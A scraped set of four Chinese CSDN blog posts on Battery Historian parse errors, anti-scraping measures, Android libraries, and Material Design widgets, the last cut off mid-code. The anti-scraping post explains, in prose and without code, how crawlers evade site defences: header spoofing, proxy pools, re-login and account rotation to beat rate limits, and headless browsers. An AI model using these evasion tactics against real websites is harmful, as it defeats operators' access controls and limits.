{"timestamp": "2018_08_14_11_12_43", "desc": "could not parse aggregated battery stats\n\n\n之前有一篇文章Android5.0系统耗电分析中提到用Battery Historian来分析耗电问题，但是在最近几次用Battery Historian2.0分析的时候点击Submit按钮analyse成功后，进入界面的报错“Note: Could not parse aggregated battery stats.”，点击error按钮，出现如下提示： \n \n也就是说你查看不了Battery Historian2.0视图，可能在解析的时候报错了，那么我们可以不查看Battery Historian2.0的分析视图，只查看Battery Historian1.0的，可以进入…\\battery-historian\\scripts目录，在这里面你就看到了“historian.py”这个就是把bugreport.txt转化成html文件的py实现，然后在这里目录打开cmd之下一下命令：python historian.py -a bugreport.txt > battery.html就可以看到在这个目录下生成了html文件，然后用谷歌浏览器直接打开html文件即可查看耗电的一些信息，但是个人感觉Battery Historian1.0的耗电分析视图没有2.0来的详细和直观，以下为截图： \n \nBattery Historian1.0耗电分析视图： \n \n但是我对这个问题“could not parse aggregated battery stats”感觉特别不爽，因为我用我们android系统5.0（MTK提供）的user debug版本手表（root）都可以正常使用，为啥一换到root过的手机，还是google官方的6.0系统就不行了呢？于是乎，一顿google，记住。一定要用google，不要用百度，用百度你用换搜索不到重点。在这里我找到灵感：could not parse aggregated battery stats，这里面有很多Battery Historian的issu问答，我们关注的是： \nDefinitely not server-side, it means your bugreport is invalid. Yes, a bug in the ROM is likely the cause. It may be possible to fix the report in a text editor though. There will likely be two lines with “,vers,” lines in them. If you delete one of them the first error should disappear. Same should be the case for “,bt,”. If you look for lines with that in it there should be two of them. Delete one and things might work.（大概的意思是说bugreport文件不可用，可能是rom的一个bug导致的，那么要解决这个bug就找到bugreport.txt文件下的“,vers,”发现有两个这个东西，那么删除其中一个，然后再搜“,bt,”也有两个，也删除其中一个，当然，删除哪一个？）\nIt definitely helps for the errors, even though it doesn’t fix the fact I only see the Historian-tab. I now get a new error about ‘global network field already exists’, I’ll try to fix this in the same way. I’ll also try another nightly, maybe this is an incidental bug.（当你删除了一个“,vers,”后，你会发现又报错“global network field already exists”）\nIf there are a lot of these you can look through this. The “,bt,” and “,vers,” are section identifiers. If you’re seeing “global network field already exists”, you should look for “,gn,”. \nI’ll also add that you should probably delete the first line in the case of battery stuff and the second line in the case of version. I think they should probably be ordered chronologically but really there shouldn’t be multiple at all so who knows.（针对2中问提，找到“,bt,”也发现有两个，删除其中一个，这个“,bt,”应该是紧跟着刚才删除的“,vers,”，“,gn,”也是如此，也要删除多余的那一行） \n至此：按照如上三个步骤我们已经在bugreport.txt文件中的这三行内容： \n\n\n9,0,i,vers,15,133,MOB31K,MOB31K\n\n9,0,l,bt,0,0,0,238067037,173720359,1483685378198,0,0\n\n9,0,l,gn,0,0,0,0,0,0,0,0\n\n很可惜的是，依然报错： \n \n但是很明显，报错变少了，说明我们以上做的修改还有有点用的，于是我预测是不是还有些东西没有删除掉，经过上面的一个过程下来，隐约感觉到是不是由于bugreport.txt文件里面有些参数重复了导致视图解析不出来，例如“,vers,”，“,bt,”，“,gn,”都是重复的，然后删除掉一行，继续google，证实了这个问题：Battery Historian is complaining because it only expects one log per file.，于是我就再去bugreport.txt文件中找，是不是还有类似的参数没有删除呢？在刚才删除的那三行下面我看到这么一些东西：\n\n9,0,i,vers,15,133,MOB31K,MOB31K\n\n9,0,l,bt,0,0,0,238067037,173720359,1483685378198,0,0\n\n9,0,l,gn,0,0,0,0,0,0,0,0\n// 以上三行是已经删除的\n9,0,l,gwfl,0,0,0,0,0,0\n\n9,0,l,gble,0,0,0,0\n\n9,0,l,m,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\n\n9,0,l,br,0,0,0,0,0\n\n9,0,l,sgt,0,0,0,0,0\n\n9,0,l,sst,0\n\n9,0,l,sgc,0,0,0,0,0\n\n9,0,l,dct,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\n\n9,0,l,dcc,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\n\n9,0,l,wst,0,0,0,0,0,0,0,0\n\n9,0,l,wsc,0,0,0,0,0,0,0,0\n\n9,0,l,wsst,0,0,0,0,0,0,0,0,0,0,0,0,0\n\n9,0,l,wssc,0,0,0,0,0,0,0,0,0,0,0,0,0\n\n9,0,l,wsgt,0,0,0,0,0\n\n9,0,l,wsgc,0,0,0,0,0\n\n9,0,l,dc,0,0,0,0\n\n奇怪的是后面跟的参数都是0，觉得不太对劲，找到那个没有删除的“,bt,”和“,bt,”看了下：\n\n9,0,l,bt,0,4034182,3304371,6220490,5490679,1483917201211,1405309,675499\n\n9,0,l,gn,7688100,795463,27082229,2909975,7858,7960,26650,28479\n\n9,0,l,gwfl,4034182,4034182,1679358,29311,32558,0\n\n9,0,l,gble,0,0,0,0\n\n9,0,l,m,2628873,0,5225,449536,1002609,34,2620589,0,12,0,0,0,0,19,25225\n\n9,0,l,br,468770,582304,1345121,154945,77733\n\n9,0,l,sgt,2612,43469,782137,2361194,844770\n\n9,0,l,sst,0\n\n9,0,l,sgc,2,7,44,157,160\n\n9,0,l,dct,2910827,0,0,0,0,0,0,0,0,0,0,0,0,1123355,0,0,0\n\n9,0,l,dcc,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0\n\n9,0,l,wst,0,0,0,0,0,0,0,0\n\n9,0,l,wsc,0,0,0,0,0,0,0,0\n\n9,0,l,wsst,0,149908,0,0,880862,0,15338,1043,13159,104,2973768,0,0\n\n...后面太长了，这里就省略了...\n\n其实“,vers,”，“,bt,”和“,bt,”都是在—— CHECKIN BATTERYSTATS (dumpsys batterystats -c) ——下的，只不过这里这三行并不连续，中间穿插一大段数据内容，而刚才删除的那三行却是连续的，而且后面带的参数都是0，经过比较发现，后面带的参数本应该是uid，进程名等参数，这些参数是不可能都为0的所以就猜测刚才删除的那些数据可能是异常数据，也许就是这里导致视图分析报错，于是就把那一整段都全部删除：\n\n9,0,i,vers,15,133,MOB31K,MOB31K\n\n9,0,l,bt,0,0,0,238067037,173720359,1483685378198,0,0\n\n9,0,l,gn,0,0,0,0,0,0,0,0\n\n9,0,l,gwfl,0,0,0,0,0,0\n\n9,0,l,gble,0,0,0,0\n\n9,0,l,m,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\n\n9,0,l,br,0,0,0,0,0\n\n9,0,l,sgt,0,0,0,0,0\n\n9,0,l,sst,0\n\n9,0,l,sgc,0,0,0,0,0\n\n9,0,l,dct,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\n\n9,0,l,dcc,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\n\n9,0,l,wst,0,0,0,0,0,0,0,0\n\n9,0,l,wsc,0,0,0,0,0,0,0,0\n\n9,0,l,wsst,0,0,0,0,0,0,0,0,0,0,0,0,0\n\n9,0,l,wssc,0,0,0,0,0,0,0,0,0,0,0,0,0\n\n9,0,l,wsgt,0,0,0,0,0\n\n9,0,l,wsgc,0,0,0,0,0\n\n9,0,l,dc,0,0,0,0\n\n然后保存下bugreport.txt，在去submit分析，发现居然成功的显示出视图了： \n \n到这里有两个tab页面，一个是2.0的，一个是1.0的，1.0的tab显示会被下面的覆盖掉，而1.0关于wake lock唤醒信息比较详细，所以可以用python historian.py -a bugreport.txt > battery.html命令单独转换生成1.0的分析视图，这个上面已经提及，好啦，问题解决！", "time": "2018_08_14_11_12_43", "link": "https://blog.csdn.net/lhd201006/article/details/54287494", "title": "Battery Historian2.0使用过程中遇到的一些问题"}
{"timestamp": "2018_08_14_11_12_44", "desc": "随之大数据的火热，网络上各种网页抓取/爬虫工具蜂拥而来，因而，网页数据成了大家竞争掠夺的资源，但网站运营者却要开始保护自己的数据资源，以避免被竞争对手获取到自己的数据，防止更大的商业损失。下面总结一下反爬虫策略及其应对方法。 \n一、什么是爬虫和反爬虫\n\n爬虫和反爬虫作为相生相克的死对头，无论爬虫多厉害，都是能被复杂的反爬虫机制发现，同样的，无论反爬虫机制多么缜密，都是能被高级的网络爬虫所攻破，胜负的关键就看双方的资源投入多少了。为了更好地理解爬虫和反爬虫机制，下面有一些定义： \n爬虫：使用任何技术手段，批量获取网站信息的一种方式。关键在于批量。 反爬虫：使用任何技术手段，阻止别人批量获取自己网站信息的一种方式。关键也在于批量。 \n误伤：在反爬虫的过程中，错误的将普通用户识别为爬虫。误伤率高的反爬虫策略，效果再好也不能用。 \n拦截：成功地阻止爬虫访问。这里会有拦截率的概念。通常来说，拦截率越高的反爬虫策略，误伤的可能性就越高。因此需要做个权衡。 \n所以，我们可以知道，爬虫有一个最基本的特征就是批量，而反爬虫机制也是根据这个特征来做判断的，但反爬虫还是一个权衡利弊的选择，既要较低的误伤率，又要较高的拦截率，这也是它的漏洞。关于网站为什么以及如何制定反爬虫策略，可以看携程酒店技术部总结的关于反爬虫的心得体会。 \n二、反爬虫方法及其应对\n\n一般网站从三个方面反爬虫：请求网站访问时的请求头Headers，用户行为，目标网站的目录和数据加载方式。前两个方面可以说是反爬虫策略中最为常见的，而第三个则是应用ajax（异步加载）的方式加载页面目录或者内容，增大爬虫在对目标网站形成访问之后获取数据的难度。 \n但是仅仅检验一下请求头或者做几个ip限制显然无法达到网站运营者对anti-spam的要求，所以更进一步的反制措施也不少。最主要的大概有：Cookie限制，验证码反爬虫，以及Noscript。 \n2.1 通过Headers反爬虫 \n从用户请求的Headers反爬虫是最常见的反爬虫策略。由于正常用户访问网站时是通过浏览器访问的，所以目标网站通常会在收到请求时校验Headers中的User-Agent字段，如果不是携带正常的User-Agent信息的请求便无法通过请求。还有一部分网站为了防盗链，还会校验请求Headers中的Referer字段。 如果遇到了这类反爬虫机制，可以直接在自己写的爬虫中添加Headers，将浏览器的User-Agent复制到爬虫的Headers中；另外通过对请求的抓包分析，将Referer值修改为目标网站域名，就能很好的绕过。 \n2.2 基于用户行为反爬虫 \n还有一些网站会通过用户的行为来检测网站的访问者是否是爬虫，例如同一IP短时间内多次访问同一页面，或者同一账户短时间内多次进行相同操作。 大多数网站都是前一种情况，对于这种情况有两种策略： \n1）使用代理ip。例如可以专门写一个在网上抓取可用代理ip的脚本，然后将抓取到的代理ip维护到代理池中供爬虫使用，当然，实际上抓取的ip不论是免费的还是付费的，通常的使用效果都极为一般，如果需要抓取高价值数据的话也可以考虑购买宽带adsl拨号的VPS，如果ip被目标网站被封掉，重新拨号即可。 \n2）降低请求频率。例如每个一个时间段请求一次或者请求若干次之后sleep一段时间。由于网站获取到的ip是一个区域网的ip，该ip被区域内的所有人共享，因此这个间隔时间并不需要特别长 \n对于第二种情况，可以在每次请求后随机间隔几秒再进行下一次请求。对于有逻辑漏洞的网站，可以通过请求几次，退出登录，重新登录，继续请求来绕过同一账号短时间内不能多次进行相同请求的限制，如果能有多个账户，切换使用，效果更佳。 \n2.3 动态页面的反爬虫 \n上述的几种情况大多都是出现在静态页面，但是对于动态网页，我们需要爬取的数据是通过ajax请求得到，或者通过JavaScript生成的。首先用Firebug或者HttpFox对网络请求进行分析。如果能够找到ajax请求，也能分析出具体的参数和响应的具体含义，我们就能采用上面的方法，直接利用requests或者urllib2模拟ajax请求，对响应的json进行分析得到需要的数据。 \n能够直接模拟ajax请求获取数据固然是极好的，但是有些网站把ajax请求的所有参数全部加密了。我们根本没办法构造自己所需要的数据的请求。还有一些严防死守的网站，除了加密ajax参数，它还把一些基本的功能都封装了，全部都是在调用自己的接口，而接口参数都是加密的。 \n遇到这样的网站，我们就不能用上面的方法了，通过selenium+phantomJS框架，调用浏览器内核，并利用phantomJS执行js来模拟人为操作以及触发页面中的js脚本。从填写表单到点击按钮再到滚动页面，全部都可以模拟，不考虑具体的请求和响应过程，只是完完整整的把人浏览页面获取数据的过程模拟一遍。用这套框架几乎能绕过大多数的反爬虫，因为它不是在伪装成浏览器来获取数据（上述的通过添加 \nHeaders一定程度上就是为了伪装成浏览器），它本身就是浏览器，phantomJS就是一个没有界面的浏览器，只是操控这个浏览器的不是人。 \n2.4 Cookie限制 \n和Headers校验的反爬虫机制类似，当用户向目标网站发送请求时，会再请求数据中携带Cookie，网站通过校验请求信息是否存在Cookie，以及校验Cookie的值来判定发起访问请求的到底是真实的用户还是爬虫，第一次打开网页会生成一个随机cookie，如果再次打开网页这个Cookie不存在，那么再次设置，第三次打开仍然不存在，这就非常有可能是爬虫在工作了。 \n而Cookie校验和Headers的区别在于，用户发送的Headers的内容形式是固定的可以被轻易伪造的，Cookie则不然。原因是由于，我们在分析浏览器请求网站访问的过程中所分析得到的Cookie往往都是经过相关的js等过程已经改变了domain的Cookie，假如直接手动修改爬虫携带的Cookie去访问对应的网页，由于携带的Cookie已经是访问之后的domain而不是访问之前的domain，所以是无法成功模拟整个流程的，这种情况必然导致爬虫访问页面失败。 分析Cookie，可能会携带大量的随机哈希字符串，或者不同时间戳组合的字符串，并且会根据每次访问更新domain的值。对这种限制，首先要在对目标网站抓包分析时，必须先清空浏览器的Cookie，然后在初次访问时，观察浏览器在完成访问的过程中的请求细节（通常会在这一过程中发生若干次301/302转跳，每次转跳网站返回不同的Cookie给浏览器然后在最后一次转跳中请求成功）。在抓包完成对请求细节的分析之后，再在爬虫上模拟这一转跳过程，然后截取Cookie作为爬虫自身携带的Cookie，这样就能够绕过Cookie的限制完成对目标网站的访问了。 \n2.5 验证码限制 \n这是一个相当古老但却不失有效性的反爬虫策略。更早的时候，这种验证码可以通过OCR技术进行简单的图像识别破解，但是现在来说，验证码的干扰线，噪点已经多到肉眼都无法轻易识别的地步。所以目前而言，由于OCR技术发展不力，验证码技术反而成为了许多网站最有效的手段之一。 \n验证码除了识别难题之外，还有另外一个值得注意的问题。现在有许多网站都在使用第三方验证码服务。当用户打开目标网站的登录页面时，登录页面显示的验证码是从第三方(比如阿里云)提供的链接加载的，这时候我们在模拟登录的时候，需要多一步从网页提供的第三方链接抓取验证码的步骤，而这一步常常暗含着陷阱。以阿里云提供的验证码服务为例，登录页面的源代码会显示阿里云提供的第三方链接，但是当匹配出这个链接进行验证码抓取的时候我们会发现验证码是无效的。当仔细分析抓包的请求数据之后，发现正常浏览器在请求验证码时，会多带一个ts参数，而这个参数是由当前时间戳产生的，但是并不是完全的时间戳，而是时间戳四舍五入保留九位数字之后的字符串，对待这种第三方服务只能是细心加运气，三分天注定七分不信命来猜一发了。还有另外一种特殊的第三方验证码，所谓的拖动验证，只能说，互联网创业有三种模式2b，2c，2vc。", "time": "2018_08_14_11_12_44", "link": "https://blog.csdn.net/yixuandong9010/article/details/75861233", "title": "反爬虫技术方案"}
{"timestamp": "2018_08_14_11_12_44", "desc": "缓存\n\n　　名称描述\n\n　　DiskLruCache: Java实现基于LRU的磁盘缓存\n\n\n2.图片加载\n\n　　名称描述\n\n　　Android    Universal Image Loader 一个强大的加载，缓存，展示图片的库\n\n　　Picasso    一个强大的图片下载与缓存的库\n\n　　Fresco    一个用于管理图像和他们使用的内存的库\n\n　　Glide    一个图片加载和缓存的库\n\n　　公众号：JANiubility\n\n\n图片处理\n\n　　名称描述\n\n　　Picasso-transformations    一个为 Picasso 提供多种图片变换的库\n\n　　Glide-transformations     一个为 Glide 提供多种图片变换的库\n\n　　Android-gpuimage     基于OpenGL的Android过滤器\n网络请求\n\n　　名称描述\n\n　　Android Async     HTTP Android异步HTTP库\n\n　　AndroidAsync     异步Socket，HTTP(客户端+服务器)，WebSocket，和socket.io库。基于NIO而不是线程。\n\n　　OkHttp     一个Http与Http/2的客户端\n\n　　Retrofit     类型安全的Http客户端\n\n　　Volley     Google推出的Android异步网络请求框架和图片加载框架\n网络解析\n\n　　名称描述\n\n　　Gson     一个Java序列化/反序列化库，可以将JSON和java对象互相转换\n\n　　Jackson Jackson     可以轻松地将Java对象转换成json对象和xml文档，同样也可以将json、xml转换成Java对象\n\n　　Fastjson     Java上一个快速的JSON解析器/生成器\n\n　　HtmlPaser     一种用来解析单个独立html或嵌套html的方式\n\n　　Jsoup     一个以最好的DOM，CSS和jQuery解析html的库\n数据库\n\n　　名称描述\n\n　　OrmLite    JDBC和Android的轻量级ORM java包\n\n　　Sugar    用超级简单的方法处理Android数据库\n\n　　GreenDAO     一种轻快地将对象映射到SQLite数据库的ORM解决方案\n\n　　ActiveAndroid     以活动记录方式为Android SQLite提供持久化\n\n　　SQLBrite     SQLiteOpenHelper 和ContentResolver的轻量级包装\n\n　　Realm 移动数据库：一个SQLite和ORM的替换品\n依赖注入\n\n　　名称描述\n\n　　ButterKnife     将Android视图和回调方法绑定到字段和方法上\n\n　　Dagger2     一个Android和java快速依赖注射器。\n\n　　AndroidAnotations     快速安卓开发。易于维护\n\n　　RoboGuice     Android平台的Google Guice\n图表\n\n　　名称描述\n\n　　WilliamChart     创建图表的Android库\n\n　　HelloCharts     兼容到API8的Android图表库\n\n　　MPAndroidChart     一个强大的Android图表视图/图形库\n后台处理\n\n　　名称描述\n\n　　Tape     一个轻快的，事务性的，基于文件的FIFO的库\n\n　　Android Priority Job Queue     一个专门为Android轻松调度任务的工作队列\n事件总线\n\n　　名称描述\n\n　　EventBus     安卓优化的事件总线，简化了活动、片段、线程、服务等的通信\n\n　　Otto     一个基于Guava的增强的事件总线\n响应式编程\n\n　　名称描述\n\n　　RxJava     JVM上的响应式扩展\n\n　　RxJavaJoins     为RxJava提供Joins操作\n\n　　RxAndroid     Android上的响应式扩展，在RxJava基础上添加了Android线程调度\n\n　　RxBinding     提供用RxJava绑定Android UI的API\n\n　　Agera     Android上的响应式编程\nLog框架\n\n　　名称描述\n\n　　Logger     简单，漂亮，强大的Android日志工具\n\n　　Hugo     在调试版本上注解的触发方法进行日志记录\n\n　　Timber     一个小的，可扩展的日志工具\n测试框架\n\n　　名称描述\n\n　　Mockito     Java编写的Mocking单元测试框架\n\n　　Robotium     Android UI 测试\n\n　　Robolectric     Android单元测试框架\n\n　　Android自带很多测试工具：JUnit，Monkeyrunner，UiAutomator，Espresso等\n调试框架\n\n　　名称描述\n\n　　Stetho     调试Android应用的桥梁，使得可以利用Chrome开发者工具进行调试\n性能优化\n\n　　名称描述\n\n　　LeakCanary     内存泄漏检测工具\n\n　　ACRA     Android应用程序崩溃报告\n\n　　关于Java和Android大牛频道\n\n　　Java和Android大牛频道是一个数万人关注的探讨Java和Android开发的公众号，分享和原创最有价值的干货文章，让你成为这方面的大牛!\n\n　　我们探讨android和Java开发最前沿的技术： android性能优化 ，插件化，跨平台，动态化，加固和反破解等，也讨论设计模式/软件架构 等。由一 群来自BAT的工程师组成的团队 。", "time": "2018_08_14_11_12_44", "link": "https://blog.csdn.net/ccg_201216323/article/details/53704016", "title": "经受时间沉淀的15 个 Android 通用流行框架大全"}
{"timestamp": "2018_08_14_11_12_45", "desc": "前言： \n上一篇Android 5.0的文章，小编仔细学习使用了TextInputLayout和Snackbar，不清楚的可以查看原文链接，这一篇文章中将会全部介绍5.0中其它比较常用的控件，下面是目录：\n\n\nMaterial Dialog\nFloatingActionButton\nSwipeRefreshLayout\nLinearLayoutCompat\nListPopupWindow\nPopupMenu\nToolbar\nTabLayout(选项卡布局)\nAppBarLayout（程序栏布局）&& CoordinatorLayout（协作布局）\nCollapsingToolbarLayout（折叠工具栏布局）\nNestedScrollView的使用\n\n\n\n\nMaterial Dialog\n\nDialog我们在开发中经常用到，但不经常使用V7包里面的Material 风格的对话框，建议以后使用这种Dialog，效果太酷了。\n\n\n\n private void showMaterialDialog() {\n        android.support.v7.app.AlertDialog.Builder builder = new AlertDialog.Builder(this);\n        builder.setMessage(\"我爱你 爱着你就像老鼠爱大米\")\n                .setCancelable(false)\n                .setNegativeButton(\"取消\", null)\n                .setPositiveButton(\"确定\", null)\n                .setTitle(\"this is a Material Design Dialog\")\n                .show();\n}\n\n效果如下： \n\n\n\n\nFloatingActionButton（悬浮的按钮）\n\n在android.support.design.widget包下面，可以使用FloatingActionButton来做悬浮按钮，虽然这种效果我们可以使用ImageView来实现，但谷歌给我们提供了做悬浮按钮的控件我们就不用再自己创造了，查看FloatingActionButton的源代码可以发现，此控件是继承自ImageView的，所以可是使用ImageView的一切属性，但它也有属于自己及的专有属性：\n\n\n\n1. app:fabSize=\"normal\"设置大小，有两种赋值分别是 “mini” 和 “normal”，默认是“normal”\n2. app:borderWidth=\"10dp\"设置边框的宽度\n3. app:backgroundTint=\"@color/colorPrimary\"设置FloatingActionButton的背景颜色，默认的背景颜色是Theme主题中的<item name=\"colorAccent\">#ff0000</item>\n4. app:elevation=\"20dp\"设置FloatingActionButton阴影的深度\n\n效果如下： \n\n\n布局文件如下：\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<LinearLayout\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    android:orientation=\"horizontal\">\n\n    <android.support.design.widget.FloatingActionButton\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:layout_alignParentBottom=\"true\"\n        android:layout_alignParentRight=\"true\"\n        android:layout_margin=\"20dp\"\n        app:borderWidth=\"5dp\"\n        app:backgroundTintMode=\"src_in\"\n        app:backgroundTint=\"@color/colorPrimary\"\n        app:elevation=\"20dp\"\n        />\n\n    <android.support.design.widget.FloatingActionButton\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:layout_alignParentBottom=\"true\"\n        android:layout_alignParentRight=\"true\"\n        android:layout_margin=\"20dp\"\n        app:fabSize=\"normal\"\n        app:borderWidth=\"10dp\"\n        app:elevation=\"20dp\"\n        />\n\n    <android.support.design.widget.FloatingActionButton\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:layout_alignParentBottom=\"true\"\n        android:layout_alignParentRight=\"true\"\n        android:layout_margin=\"20dp\"\n        app:fabSize=\"mini\"\n        app:borderWidth=\"5dp\"\n        app:backgroundTintMode=\"src_in\"\n        app:backgroundTint=\"@color/colorPrimary\"\n        app:elevation=\"20dp\"\n        />\n\n</LinearLayout>\n\n\n\nSwipeRefreshLayout（下拉刷新）\n\nSwipeRefreshLayout使用这种控件做出的刷新效果现在非常见，印象比较深的就是直播APP上，它是在android.support.v4.widget包下，SwipeRefreshLayout组件下必须包裹一个可滑动的组件才可实现下拉刷新效果。\n\n布局代码如下：\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.v4.widget.SwipeRefreshLayout\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    android:id=\"@+id/swipeContainer\"\n    android:orientation=\"vertical\">\n\n    <ScrollView\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n\n        <LinearLayout\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"match_parent\"\n            android:orientation=\"vertical\"\n            >\n\n            /*这里放多个TextView来测试*/\n        </LinearLayout>\n\n    </ScrollView>\n\n</android.support.v4.widget.SwipeRefreshLayout>\n\njava程序：\n\n\n\npublic class SwipeRefreshActivity extends AppCompatActivity implements SwipeRefreshLayout.OnRefreshListener {\n\n    SwipeRefreshLayout swipeContainer;\n\n    @Override\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_swiprefresh);\n        swipeContainer = (SwipeRefreshLayout) findViewById(R.id.swipeContainer);\n        //设置下拉刷新监听事件\n        swipeContainer.setOnRefreshListener(this);\n        //设置进度条的颜色\n        swipeContainer.setColorSchemeColors(Color.RED, Color.BLUE, Color.GREEN);\n        //设置圆形进度条大小\n        swipeContainer.setSize(SwipeRefreshLayout.DEFAULT);\n        //设置进度条背景颜色\n//        swipeContainer.setProgressBackgroundColorSchemeColor(Color.DKGRAY);\n        //设置下拉多少距离之后开始刷新数据\n//        swipeContainer.setDistanceToTriggerSync(50);\n\n    }\n    @Override\n    public void onRefresh() {\n        new Handler().postDelayed(new Runnable() {\n            @Override\n            public void run() {\n                Snackbar.make(swipeContainer, \"刷新结束\", Snackbar.LENGTH_SHORT).show();\n                swipeContainer.setRefreshing(false);\n            }\n        }, 2000);\n    }\n}\n\n\nSwipeRefreshLayout的一些常用的设置都写在代码中了，在不设置进度条颜色的时候默认是黑色的，SwipeRefreshLayout只有下拉刷新的功能，但在实际开发中还需要上拉加载功能，这都可以去Github上search 。\n\n效果如下： \n\n\n\n\nLinearLayoutCompat\n\nV7包中有一个LinearLayoutCompat组件,可以给LinerLayout 中的子元素item之间设置分割线。\n\n布局文件：\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<LinearLayout\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    android:orientation=\"vertical\">\n\n    <!--divider必须放在drawable中才能生效-->\n    <android.support.v7.widget.LinearLayoutCompat\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\"\n        android:orientation=\"vertical\"\n        app:divider=\"@drawable/line\"\n        app:dividerPadding=\"10dp\"\n        app:showDividers=\"middle\"\n        >\n\n        <TextView\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\"\n            android:background=\"#ffffff\"\n            android:gravity=\"center\"\n            android:padding=\"10dp\"\n            android:text=\"text\"\n            android:textAllCaps=\"false\"\n            android:textColor=\"@color/colorAccent\"\n            android:textSize=\"14sp\"/>\n\n        <TextView\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\"\n            android:background=\"#ffffff\"\n            android:gravity=\"center\"\n            android:padding=\"10dp\"\n            android:text=\"text\"\n            android:textAllCaps=\"false\"\n            android:textColor=\"@color/colorAccent\"\n            android:textSize=\"14sp\"/>\n\n        <TextView\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\"\n            android:background=\"#ffffff\"\n            android:gravity=\"center\"\n            android:padding=\"10dp\"\n            android:text=\"text\"\n            android:textAllCaps=\"false\"\n            android:textColor=\"@color/colorAccent\"\n            android:textSize=\"14sp\"/>\n\n        <TextView\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\"\n            android:background=\"#ffffff\"\n            android:gravity=\"center\"\n            android:padding=\"10dp\"\n            android:text=\"text\"\n            android:textAllCaps=\"false\"\n            android:textColor=\"@color/colorAccent\"\n            android:textSize=\"14sp\"/>\n    </android.support.v7.widget.LinearLayoutCompat>\n\n</LinearLayout>\n\n\nLinearLayoutCompat控件有几个属性：\n\n\n\n1. app:divider=”@drawable/line” 给分隔线设置颜色，这里你需要在drawable在定义shape资源，否则将没有效果，不信的小伙伴can try。\n1. app:dividerPadding=”25dp” 给分隔线设置填充大小。\n1. app:showDividers=”middle|beginning|end” 分隔线显示的位置，有四种参数值：middle 每个item之间，beginning最顶端显示分隔线，end 最底端显示分隔线，none不显示间隔线。\n\n效果如下;\n\n\n\n\n\nPopupWindow\n\nPopupWindow这个控件在开发中经常用到，但V7包中还有一个PopupWindow，可以实现简单的PopupWindow的效果。 \n测试程序：\n\n\n\npublic void showListPopup(View view) {\n        String items[] = {\"item1\", \"item2\", \"item3\", \"item4\", \"item5\"};\n        final ListPopupWindow listPopupWindow = new ListPopupWindow(this);\n\n        //设置ListView类型的适配器\n        listPopupWindow.setAdapter(new ArrayAdapter<String>(ListPopupWindowActivity.this, android.R.layout.simple_list_item_1, items));\n\n        //给每个item设置监听事件\n        listPopupWindow.setOnItemClickListener(new AdapterView.OnItemClickListener() {\n            @Override\n            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {\n                Snackbar.make(lineContainer, \"the position is\" + position, Snackbar.LENGTH_SHORT)\n                        .setCallback(new Snackbar.Callback() {\n                            @Override\n                            public void onDismissed(Snackbar snackbar, int event) {\n                                super.onDismissed(snackbar, event);\n                                new android.os.Handler().postDelayed(new Runnable() {\n                                    @Override\n                                    public void run() {\n                                        listPopupWindow.dismiss();\n                                    }\n                                }, 500);\n                            }\n                        })\n                        .show();\n            }\n        });\n        //设置ListPopupWindow的锚点,也就是弹出框的位置是相对当前参数View的位置来显示，\n        listPopupWindow.setAnchorView(view);\n        //ListPopupWindow 水平偏移量\n        listPopupWindow.setHorizontalOffset(100);\n        listPopupWindow.setVerticalOffset(100);\n        //设置对话框的宽高\n        listPopupWindow.setWidth(lineContainer.getLayoutParams().width);\n        listPopupWindow.setHeight(600);\n        listPopupWindow.setModal(false);\n        //设置点击外边区域不可取消\n        listPopupWindow.setForceIgnoreOutsideTouch(true);\n        listPopupWindow.show();\n    }\n\n效果图如下： \n\n\n\n\nPopupMenu\n\n这是一个菜单式弹出框的控件，可以用这个控件来使用Menu中的文件，简单来使用一下。\n\n测试程序：\n\n\n\npublic void showPopupMenu(View view) {\n        //参数View 是设置当前菜单显示的相对于View组件位置，具体位置系统会处理\n        PopupMenu popupMenu = new PopupMenu(this, view);\n        //加载menu布局\n        popupMenu.getMenuInflater().inflate(R.menu.menu_popmenu, popupMenu.getMenu());\n\n        //设置menu中的item点击事件\n        popupMenu.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {\n            @Override\n            public boolean onMenuItemClick(MenuItem item) {\n                switch (item.getItemId()) {\n                    case R.id.share:\n                        Snackbar.make(line1Container, \"share\", Snackbar.LENGTH_SHORT).show();\n                        break;\n                    case R.id.setting:\n                        Snackbar.make(line1Container, \"setting\", Snackbar.LENGTH_SHORT).show();\n                        break;\n                    case R.id.cancle:\n                        Snackbar.make(line1Container, \"cancle\", Snackbar.LENGTH_SHORT).show();\n                        break;\n                }\n                return true;\n            }\n        });\n        popupMenu.show();\n    }\n\nmenu代码：\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<menu xmlns:android=\"http://schemas.android.com/apk/res/android\">\n    <item\n        